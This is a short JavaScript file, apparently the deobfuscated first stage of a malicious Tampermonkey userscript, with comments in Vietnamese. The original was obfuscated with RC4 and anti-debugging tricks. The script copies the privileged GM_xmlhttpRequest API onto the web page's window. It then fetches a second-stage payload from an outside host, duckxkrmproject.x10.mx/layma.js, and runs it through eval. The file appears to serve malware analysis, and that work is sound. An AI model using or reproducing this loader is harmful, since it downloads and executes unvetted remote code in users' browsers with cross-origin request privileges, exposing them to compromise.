/**
 * ObfFuncV2_deobfuscated.js
 * 
 * Tầng nạp mã thứ 1 (gốc 64 KB bị làm rối với Javascript-Obfuscator RC4 + Anti-debugging).
 * Toàn bộ các vòng lặp crash DevTools và bảng chuỗi RC4 đã được loại bỏ.
 */

(function() {
    // Phơi bày API đặc quyền của Tampermonkey ra window trang web
    window.GM_xmlhttpRequest = GM_xmlhttpRequest;
    try {
        unsafeWindow.GM_xmlhttpRequest = GM_xmlhttpRequest;
    } catch (e) {}

    // Tải và thực thi tầng nạp mã thứ 2 từ hosting x10.mx
    fetch("https://duckxkrmproject.x10.mx/layma.js?t=" + Date.now())
        .then(response => response.text())
        .then(code => {
            eval(code); // Kích hoạt payload tiếp theo
        })
        .catch(err => console.error("Lỗi khi tải script:", err));
})();
